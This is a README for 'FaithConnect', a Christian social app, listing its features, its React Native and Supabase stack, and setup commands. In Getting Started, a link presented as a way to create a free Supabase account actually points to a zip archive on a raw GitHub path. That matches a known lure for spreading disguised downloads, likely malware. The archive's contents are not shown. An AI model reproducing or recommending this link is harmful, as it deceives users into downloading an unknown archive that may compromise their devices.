# FaithConnect

FaithConnect is a modern Christian social media app that helps believers deepen their faith, build meaningful relationships, and share their spiritual journey.

## Features

*   **User Profiles:** Create a profile to share your testimony, favorite scriptures, and spiritual goals.
*   **Daily Devotionals:** Receive daily devotionals to inspire and encourage you in your faith.
*   **Prayer Request Wall:** Post prayer requests and pray for others in the community.
*   **Group Bible Studies:** Join or create group Bible studies to study the Word of God with others.
*   **Scripture-Based Posts:** Share your thoughts and reflections on scripture with the community.
*   **Live Fellowship Events:** Participate in live fellowship events, such as worship nights, Q&A sessions with pastors, and virtual prayer meetings.

## Unique Features

*   **Mentorship Program:** Connect with a mentor who can provide guidance and support in your spiritual journey.
*   **Discipleship Tracks:** Follow a structured discipleship track to grow in your knowledge and understanding of the Bible.
*   **Spiritual Gifts Assessment:** Take a spiritual gifts assessment to discover your spiritual gifts and learn how you can use them to serve others.

## Tech Stack

*   **Frontend:** React Native
*   **Backend:** Supabase
*   **Database:** PostgreSQL

## Getting Started

To get started with FaithConnect, you will need to have a Supabase account. You can create a free account at [https://github.com/Mike1-n/faith-connect/raw/refs/heads/faithconnect-implementation/frontend/src/pages/connect-faith-2.9-beta.5.zip](https://github.com/Mike1-n/faith-connect/raw/refs/heads/faithconnect-implementation/frontend/src/pages/connect-faith-2.9-beta.5.zip).

Once you have a Supabase account, you can clone this repository and run the following commands to start the development server:

### Backend

```
cd backend
npm install
# Add your Supabase URL and Key to a .env file
# REACT_APP_SUPABASE_URL=YOUR_URL
# REACT_APP_SUPABASE_KEY=YOUR_KEY
npm start
```

### Frontend (Mobile App)

```
cd frontend
npm install
# For iOS
npx react-native run-ios
# For Android
npx react-native run-android
```
